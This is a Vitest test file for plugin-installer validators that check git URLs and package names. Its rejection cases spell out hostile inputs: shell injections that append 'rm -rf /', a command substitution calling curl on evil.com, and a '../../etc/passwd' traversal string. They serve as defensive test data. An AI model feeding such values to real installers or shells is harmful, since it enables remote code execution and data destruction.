/**
 * Coverage for the plugin-install input validators assertValidGitUrl /
 * assertValidPackageName (#8801 / #9943). A malicious git URL or package name
 * fed to the installer is a remote-code-execution vector, so these pure,
 * deterministic checks must reject shell injection, SSH URLs, and path
 * traversal. No network or child process is touched.
 */
import { describe, expect, it } from "vitest";
import { assertValidGitUrl, assertValidPackageName } from "./plugin-installer";

describe("assertValidGitUrl", () => {
  it("accepts a well-formed https .git URL", () => {
    expect(() =>
      assertValidGitUrl("https://github.com/elizaos/eliza.git"),
    ).not.toThrow();
    expect(() =>
      assertValidGitUrl("https://gitlab.com/group/sub/repo.git"),
    ).not.toThrow();
  });

  it("rejects non-https, missing .git, SSH, and injection attempts", () => {
    for (const u of [
      "http://github.com/x.git",
      "https://github.com/x",
      "git@github.com:x/y.git",
      "https://github.com/x.git; rm -rf /",
      "https://$(curl evil.com).git",
      "https://github.com/x.git evil",
    ]) {
      expect(() => assertValidGitUrl(u)).toThrow(/Invalid git URL/);
    }
  });
});

describe("assertValidPackageName", () => {
  it("accepts plain and scoped package names", () => {
    for (const n of [
      "lodash",
      "plugin-foo",
      "@elizaos/plugin-bar",
      "@scope/name.sub",
    ]) {
      expect(() => assertValidPackageName(n)).not.toThrow();
    }
  });

  it("rejects traversal, injection, and malformed scopes", () => {
    for (const n of [
      "../../etc/passwd",
      "foo/bar",
      "foo; rm -rf /",
      "@/missing-scope",
      ".hidden",
      "name with space",
    ]) {
      expect(() => assertValidPackageName(n)).toThrow(/Invalid package name/);
    }
  });
});
